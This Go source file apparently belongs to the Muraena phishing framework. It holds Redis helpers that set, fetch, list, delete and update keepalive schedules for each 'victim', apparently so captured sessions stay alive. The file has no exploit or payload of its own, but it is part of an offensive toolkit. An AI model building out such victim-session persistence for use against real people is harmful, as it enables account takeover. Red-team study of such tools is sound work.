package db

import (
	"fmt"
	"time"

	"github.com/gomodule/redigo/redis"

	"github.com/muraenateam/muraena/session"
)

type Keepalive struct {
	VictimID    string `redis:"-"`
	IntervalMin string `redis:"intervalMin"`
	Enabled     string `redis:"enabled"`
	LastRun     string `redis:"lastRun"`
	NextRun     string `redis:"nextRun"`
}

func kaKey(id string) string { return fmt.Sprintf("keepalive:%s", id) }

func SetKeepalive(victimID string, intervalMin int) error {
	rc := session.RedisPool.Get()
	defer rc.Close()
	next := time.Now().Add(time.Duration(intervalMin) * time.Minute).UTC().Format(time.RFC3339)
	if _, err := rc.Do("HMSET", kaKey(victimID),
		"intervalMin", fmt.Sprintf("%d", intervalMin),
		"enabled", "1", "nextRun", next); err != nil {
		return err
	}
	_, err := rc.Do("SADD", "keepalives", victimID)
	return err
}

func GetKeepalive(victimID string) (*Keepalive, bool, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()
	vals, err := redis.Values(rc.Do("HGETALL", kaKey(victimID)))
	if err != nil {
		return nil, false, err
	}
	if len(vals) == 0 {
		return nil, false, nil
	}
	k := Keepalive{VictimID: victimID}
	if err := redis.ScanStruct(vals, &k); err != nil {
		return nil, false, err
	}
	return &k, true, nil
}

func GetAllKeepalives() ([]Keepalive, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()
	ids, err := redis.Strings(rc.Do("SMEMBERS", "keepalives"))
	if err != nil {
		return nil, err
	}
	var out []Keepalive
	for _, id := range ids {
		k, ok, err := GetKeepalive(id)
		if err != nil {
			return nil, err
		}
		if ok {
			out = append(out, *k)
		}
	}
	return out, nil
}

func DeleteKeepalive(victimID string) error {
	rc := session.RedisPool.Get()
	defer rc.Close()
	if _, err := rc.Do("DEL", kaKey(victimID)); err != nil {
		return err
	}
	_, err := rc.Do("SREM", "keepalives", victimID)
	return err
}

func TouchKeepalive(victimID string, lastRun, nextRun time.Time) error {
	rc := session.RedisPool.Get()
	defer rc.Close()
	_, err := rc.Do("HMSET", kaKey(victimID),
		"lastRun", lastRun.UTC().Format(time.RFC3339),
		"nextRun", nextRun.UTC().Format(time.RFC3339))
	return err
}
